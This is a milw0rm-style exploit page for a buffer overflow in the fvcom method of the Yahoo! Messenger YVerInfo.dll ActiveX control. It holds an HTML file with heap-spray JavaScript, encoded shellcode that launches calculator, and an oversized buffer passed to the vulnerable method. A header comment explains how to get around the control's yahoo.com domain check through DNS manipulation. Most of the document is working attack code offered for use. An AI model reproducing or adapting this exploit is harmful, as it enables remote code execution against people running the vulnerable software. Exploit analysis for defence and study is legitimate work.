<!--
Yahoo! Messenger (YVerInfo.dll <= 2007.8.27.1) ActiveX Control Buffer Overflows

update YM : http://messenger.yahoo.com/security_update.php?id=082907

Functions : fvcom or info;
RegKey Safe for Script: True 
RegKey Safe for Init: True
-> that functions are safely scriptable and exploitable by HeapSpray Technique

Tested : Windows XP Professional SP2 all patched,Internet Explorer 7

That functions within this class can only be called if the control believes it is being run from the yahoo.com domain. -> I used "Simple DNS Plus" for manipulating the DNS resolution.

I saved this file (exploit.htm) into directory root (web server) 
and I exploited with link : http://www.yahoo.com/exploit.htm

coder : minhbq
 mail : minhbq1985@gmail.com
-->


<html>
<!-- CLSID of YverInfo.dll -->
<object classid="CLSID:D5184A39-CBDF-4A4F-AC1A-7A45A852C883" id="target"></OBJECT>

<SCRIPT language="javascript">
// HeapSpray - execute calculator	
	shellcode = unescape("%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063");    
	bigblock = unescape("%u9090%u9090");    
    headersize = 20;    
    slackspace = headersize+shellcode.length
    while (bigblock.length<slackspace) bigblock+=bigblock;
    fillblock = bigblock.substring(0, slackspace);
    block = bigblock.substring(0, bigblock.length-slackspace);
    while(block.length+slackspace<0x40000) block = block+block+fillblock;    
	memory = new Array();
    for (i=0;i<800;i++) memory[i] = block + shellcode;

	var buffer =  unescape("%0D");
	while (buffer.length< 10000) buffer+=unescape("%0D");

// Vulnerability of method fvcom
	target.fvcom(buffer);			

</script>
</html>

# milw0rm.com [2007-09-01]